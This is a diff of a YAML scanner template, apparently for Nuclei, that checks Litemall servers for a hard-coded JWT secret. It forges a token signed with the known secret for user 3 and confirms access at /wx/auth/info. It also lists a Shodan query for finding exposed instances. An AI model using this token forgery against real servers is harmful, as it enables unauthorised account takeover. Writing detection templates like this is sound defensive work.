@@ -1,43 +1,39 @@
+http:
+- headers:
+    X-Litemall-Token: '{{ generate_jwt(payload, ''HS256'', secret) }}'
+  matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    type: word
+    words:
+    - '"errno": 0'
+    - userInfo
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/wx/auth/info'
 id: litemall-jwt
-
 info:
-  name: linlinjava Litemall - Hard-coded Credentials
-  severity: high
   author: darses
-  description: |
-    Detect linlinjava Litemall harcoded JWT secret.
   classification:
     cwe-id: CWE-798
+  description: 'Detect linlinjava Litemall harcoded JWT secret.
+
+    '
   metadata:
-    verified: false
     max-requests: 1
-    vendor: linlinjava
     product: litemall
     shodan-query:
-      - http.favicon.hash:1367958180
+    - http.favicon.hash:1367958180
+    vendor: linlinjava
+    verified: false
+  name: linlinjava Litemall - Hard-coded Credentials
+  severity: high
   tags: linlinjava,litemall,oss,jwt
-
 variables:
-  secret: "X-Litemall-Token"
+  payload: '{"sub":"this is litemall token", "aud":"MINIAPP", "iss":"LITEMALL", "exp":"{{unix_time(600)}}",
+    "userId":{{ userid }}, "iat":"{{unix_time()}}"}'
+  secret: X-Litemall-Token
   userid: 3
-  payload: '{"sub":"this is litemall token", "aud":"MINIAPP", "iss":"LITEMALL", "exp":"{{unix_time(600)}}", "userId":{{ userid }}, "iat":"{{unix_time()}}"}'
-
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/wx/auth/info"
-
-    headers:
-      X-Litemall-Token: "{{ generate_jwt(payload, 'HS256', secret) }}"
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        words:
-          - '"errno": 0'
-          - "userInfo"
-        condition: and
